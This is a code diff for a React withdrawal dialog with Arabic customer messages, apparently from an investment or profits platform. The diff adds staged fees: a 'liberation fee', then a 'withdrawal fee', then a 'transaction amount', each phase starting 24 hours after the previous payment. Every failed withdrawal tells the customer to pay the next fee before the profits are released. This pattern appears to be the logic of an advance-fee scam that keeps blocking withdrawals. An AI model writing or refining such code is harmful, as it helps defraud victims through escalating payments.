@@ -736,6 +736,18 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
   const phase2Active = hours24Passed(user.liberationFeePaidAt);
   const phase3Active = hours24Passed(user.withdrawalFeePaidAt);
 
+  const currentFeeLabel = phase3Active
+    ? "مبلغ المعاملة"
+    : phase2Active
+    ? "رسوم السحب"
+    : "رسوم التحرير";
+
+  const currentFeeAmount = phase3Active
+    ? user.transactionFee
+    : phase2Active
+    ? fees
+    : user.liberationFee;
+
   function getFailureMessage() {
     // المرحلة الثالثة: مبلغ المعاملة
     if (phase3Active) {
@@ -752,19 +764,16 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
       return `عزيز العميل / ${userName} 🚨 تعذر عملية سحب الأرباح يرجى دفع مبلغ رسوم السحب "${fees}" ريال بعد السداد يتم تحرير الأرباح بنجاح ✅`;
     }
     // المرحلة الأولى: رسوم التحرير (الوضع الحالي)
-    if (profitsNum === 0 && feesNum === 0) {
+    if (profitsNum === 0) {
       return `عزيز العميل / ${userName} 🚨 لم يتم إضافة الأرباح الى حسابك اذا كنت مشترك جديد يرجى الانتظار حتى يتم إضافة ارباح الاشتراك الى حسابك و يتم سحب ارباحك بنجاح ✅`;
-    }
-    if (profitsNum > 0 && feesNum > 0 && hasPreviousPayment) {
-      return `عزيز العميل / ${userName} 🚨 تعذر تحويل الأرباح بسبب المتبقي عليك مبلغ رسوم الأرباح المضافة ${fees} ريال بعد السداد يتم التحويل ارباحك بنجاح ✅`;
-    }
-    if (profitsNum > 0 && feesNum > 0) {
-      return `عزيز العميل / ${userName} 🚨 تعذر تحويل أرباح المتبقي عليك مبلغ رسوم تفعيل والمطابقة ${fees} ريال بعد السداد يتم التحويل ارباحك بنجاح ✅`;
     }
     if (user.liberationFeeStatus === "paid") {
       return `عزيز العميل / ${userName} 🚨 تعذر تحويل أرباح بعد سداد رسوم التحرير يرجى الإنتظار سوف يقوم النظام بتحرير حسابك وتفعيل سحب الاموال خلال اقل من 24 ساعة\nويتم سحب ارباحك بنجاح ✅`;
     }
-    return `عزيز العميل / ${userName} 🚨 تعذر تحويل أرباح المتبقي عليك مبلغ رسوم تفعيل والمطابقة ${fees} ريال بعد السداد يتم التحويل ارباحك بنجاح ✅`;
+    if (user.liberationFee === "0" || user.liberationFee === "") {
+      return `عزيز العميل / ${userName} 🚨 لم يتم إضافة رسوم تحرير الأرباح الى حسابك يرجى الانتظار حتى يتم إضافة رسوم التحرير ويتم سحب ارباحك بنجاح ✅`;
+    }
+    return `عزيز العميل / ${userName} 🚨 تعذر عملية سحب الأرباح يرجى دفع مبلغ رسوم تحرير الأرباح "${user.liberationFee}" ريال بعد السداد يتم تحرير الأرباح بنجاح ✅`;
   }
 
   function formatNum(n: number) {
@@ -796,7 +805,7 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
                 <span className="text-[16px] font-extrabold text-[#ef4444]">{formatNum(feesNum)}</span>
                 <span className="text-[12px] font-bold text-[#ef4444]">ر.س</span>
               </div>
-              <span className="text-[13px] font-semibold text-[#5a6282]">رسوم السحب :</span>
+              <span className="text-[13px] font-semibold text-[#5a6282]">{currentFeeLabel} :</span>
             </div>
             <div className="flex items-center justify-between py-3 border-b border-[#f3f5fa]">
               <div className="flex items-baseline gap-1" dir="ltr">
@@ -869,8 +878,8 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
                   <span className="text-[12px] text-[#8892a4] font-medium">المبلغ المطلوب:</span>
                 </div>
                 <div className="flex items-center justify-between">
-                  <span className="text-[13px] font-bold text-[#374151]">{fees} ر.س</span>
-                  <span className="text-[12px] text-[#8892a4] font-medium">الرسوم المطلوبة:</span>
+                  <span className="text-[13px] font-bold text-[#374151]">{currentFeeAmount} ر.س</span>
+                  <span className="text-[12px] text-[#8892a4] font-medium">{currentFeeLabel}:</span>
                 </div>
                 <div className="flex items-center justify-between">
                   <span className="text-[13px] font-bold text-[#374151]" dir="ltr">{submitTime}</span>
@@ -921,7 +930,7 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
           <div className="flex items-center justify-between px-4 py-3 rounded-2xl"
             style={{ background: "#fef9ec", border: "1.5px solid #f5d97a" }}>
             <span className="text-[18px] leading-none">⚠️</span>
-            <span className="text-[13px] font-bold text-[#92400e]">رسوم السحب : {fees} ر.س</span>
+            <span className="text-[13px] font-bold text-[#92400e]">{currentFeeLabel} : {currentFeeAmount} ر.س</span>
           </div>
           <div className="flex gap-3 mt-1">
             <button onClick={() => setStep("confirm")}
